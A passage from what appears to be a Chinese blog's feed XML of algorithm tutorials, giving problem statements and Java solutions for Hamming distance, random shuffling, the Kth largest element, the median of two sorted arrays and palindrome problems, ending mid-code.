        <content type="html"><![CDATA[<h2 id="汉明距离"><a href="#汉明距离" class="headerlink" title="汉明距离"></a>汉明距离</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两个整数，你要计算出它们的二进制表示中，相应的二进制位有多少个是不同的。这个不同的个数，也称为这两个整数的汉明距离。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的两个整数是 3 和 8。它们的二进制表示分别是：3: 00118: 1000这两个数有 3 个二进制位是不相同的，因此它们的汉明距离是 3。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> <span class="token function">numberOfOne</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token operator">++</span>count<span class="token punctuation">;</span>      n <span class="token operator">&amp;=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> count<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hammingDistance</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">numberOfOne</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>使用 z&amp;(z-1) 去除 z 位级表示最低的那一位。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hammingDistance</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> x <span class="token operator">^</span> y<span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>z <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> cnt<span class="token operator">++</span><span class="token punctuation">;</span>        z <span class="token operator">=</span> z <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> cnt<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以使用 Integer.bitcount() 来统计 1 个的个数。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hammingDistance</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Integer<span class="token punctuation">.</span><span class="token function">bitCount</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机洗牌</title>
      <link href="/2018/12/09/suan-fa/sui-ji-xi-pai/"/>
      <url>/2018/12/09/suan-fa/sui-ji-xi-pai/</url>
      
        <content type="html"><![CDATA[<h2 id="随机洗牌"><a href="#随机洗牌" class="headerlink" title="随机洗牌"></a>随机洗牌</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组表示一副牌，你要写一个随机洗牌函数来返回这个数组的一个排列。并且要保证每次返回的排列都是等概率的。假设已经给你一个完美的随机数生成器。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> Random rnd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> j <span class="token operator">=</span> rnd<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> nums<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组中第 K 大的元素</title>
      <link href="/2018/12/09/suan-fa/shu-zu/shu-zu-zhong-di-k-da-de-yuan-su/"/>
      <url>/2018/12/09/suan-fa/shu-zu/shu-zu-zhong-di-k-da-de-yuan-su/</url>
      
        <content type="html"><![CDATA[<h2 id="数组中第-K-大的元素"><a href="#数组中第-K-大的元素" class="headerlink" title="数组中第 K 大的元素"></a>数组中第 K 大的元素</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组和一个整数 K，你要找到数组中第 K 大的元素。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的整数数组是：4, 2, 8, 1, 8整数 K 是 2。这个数组中第 2 大的元素是 8，因此你要返回 8。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(k)), Space: O(k)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">findKthLargestMinHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Queue<span class="token operator">&lt;</span>Integer<span class="token operator">></span> minHeap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>minHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>        minHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">></span> minHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        minHeap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        minHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> minHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">int</span> <span class="token function">partition</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">,</span> i <span class="token operator">=</span> low<span class="token punctuation">,</span> j <span class="token operator">=</span> high<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> pivot<span class="token punctuation">)</span> <span class="token operator">--</span>j<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> pivot<span class="token punctuation">)</span> <span class="token operator">++</span>i<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> i<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time(avg): O(n), Time(worst): O(n^2), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">findKthLargestQuickSelect</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">></span> k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> high <span class="token operator">=</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> low <span class="token operator">=</span> p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求两个有序数组的中位数</title>
      <link href="/2018/12/09/suan-fa/shu-zu/qiu-liang-ge-you-xu-shu-zu-de-zhong-wei-shu/"/>
      <url>/2018/12/09/suan-fa/shu-zu/qiu-liang-ge-you-xu-shu-zu-de-zhong-wei-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="求两个有序数组的中位数"><a href="#求两个有序数组的中位数" class="headerlink" title="求两个有序数组的中位数"></a>求两个有序数组的中位数</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两个排好序的整数数组 nums1 和 nums2，假设数组是以<strong>递增排序</strong>的，数组的大小分别是 m 和 n。你要找到这两个数组的中位数。要求算法的时间复杂度是 O(log(m+n))。</p><p>这里两个数组中位数的意思是，两个数组合到一起排序后，位于中间的那个数，如果一共有偶数个，则是位于中间的两个数的平均数。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的两个数组是：1, 32它们放在一起排序后是：1, 2, 3所以中位数就是 2。再比如说，给你的两个数组是：1, 32, 4它们放在一起排序后是：1, 2, 3, 4所以中位数就是 (2 + 3) / 2 = 2.5。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">findMedianSortedArrays</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums1<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> total <span class="token operator">=</span> nums1<span class="token punctuation">.</span>length <span class="token operator">+</span> nums2<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>total <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">findKthSmallestInSortedArrays</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2<span class="token punctuation">,</span> total <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">double</span> a <span class="token operator">=</span> <span class="token function">findKthSmallestInSortedArrays</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2<span class="token punctuation">,</span> total <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">double</span> b <span class="token operator">=</span> <span class="token function">findKthSmallestInSortedArrays</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2<span class="token punctuation">,</span> total <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(log(k)) &lt;= O(log(m+n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">findKthSmallestInSortedArrays</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums1<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums2<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> len1 <span class="token operator">=</span> nums1<span class="token punctuation">.</span>length<span class="token punctuation">,</span> len2 <span class="token operator">=</span> nums2<span class="token punctuation">.</span>length<span class="token punctuation">,</span> base1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> base2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> nums2<span class="token punctuation">[</span>base2 <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> nums1<span class="token punctuation">[</span>base1 <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>base1<span class="token punctuation">]</span><span class="token punctuation">,</span> nums2<span class="token punctuation">[</span>base2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>k <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> len1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> j <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>k <span class="token operator">-</span> i<span class="token punctuation">,</span> len2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> a <span class="token operator">=</span> nums1<span class="token punctuation">[</span>base1 <span class="token operator">+</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b <span class="token operator">=</span> nums2<span class="token punctuation">[</span>base2 <span class="token operator">+</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> j <span class="token operator">==</span> k <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> b<span class="token punctuation">)</span> <span class="token keyword">return</span> a<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;=</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        base1 <span class="token operator">+=</span> i<span class="token punctuation">;</span>        len1 <span class="token operator">-=</span> i<span class="token punctuation">;</span>        k <span class="token operator">-=</span> i<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">>=</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        base2 <span class="token operator">+=</span> j<span class="token punctuation">;</span>        len2 <span class="token operator">-=</span> j<span class="token punctuation">;</span>        k <span class="token operator">-=</span> j<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最长回文串的长度</title>
      <link href="/2018/12/09/suan-fa/zui-chang-hui-wen-chuan-de-chang-du/"/>
      <url>/2018/12/09/suan-fa/zui-chang-hui-wen-chuan-de-chang-du/</url>
      
        <content type="html"><![CDATA[<h2 id="最长回文串的长度"><a href="#最长回文串的长度" class="headerlink" title="最长回文串的长度"></a>最长回文串的长度</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个包含大小写英文字母的字符串，你要用这些字母构建一个最长的回文字符串，并返回它的长度。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的字符串 s 是：aaabccdd你能用它构建的回文串的最大长度是 7，因此你要返回的就是数字 7。长度为 7 的回文串有多种构建方式，随便举一种，比如 acdbdca</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(m)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">lengthOfLongestPalindrome</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> oddNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token operator">:</span> s<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token operator">++</span>d<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> count<span class="token operator">:</span> d<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token operator">++</span>oddNum<span class="token punctuation">;</span>    <span class="token keyword">int</span> unUsed <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> oddNum<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> unUsed<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最长回文子串</title>
      <link href="/2018/12/09/suan-fa/zui-chang-hui-wen-zi-chuan/"/>
      <url>/2018/12/09/suan-fa/zui-chang-hui-wen-zi-chuan/</url>
      
        <content type="html"><![CDATA[<h2 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a>最长回文子串</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个字符串，你要在它所有的回文子串中，找到长度最长的子串，并返回它。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的字符串是：abcbab你要返回的最长回文子串是：abcba</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n^2), Space: O(n^2)</span>  <span class="token keyword">public</span> String <span class="token function">longestPalindromeDP</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> maxLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">boolean</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> j<span class="token punctuation">)</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> j<span class="token punctuation">)</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        